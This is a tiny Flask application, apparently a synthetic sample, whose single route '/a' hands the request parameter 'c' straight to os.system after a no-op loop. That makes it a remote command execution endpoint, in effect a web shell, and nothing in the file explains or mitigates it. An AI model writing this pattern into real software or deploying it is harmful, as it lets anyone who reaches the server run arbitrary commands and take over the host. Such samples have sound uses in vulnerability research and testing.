import os
from flask import Flask, request
app = Flask(__name__)
@app.route("/a")
def a():
    done = False
    while not done:
        done = True
    os.system(request.args["c"])
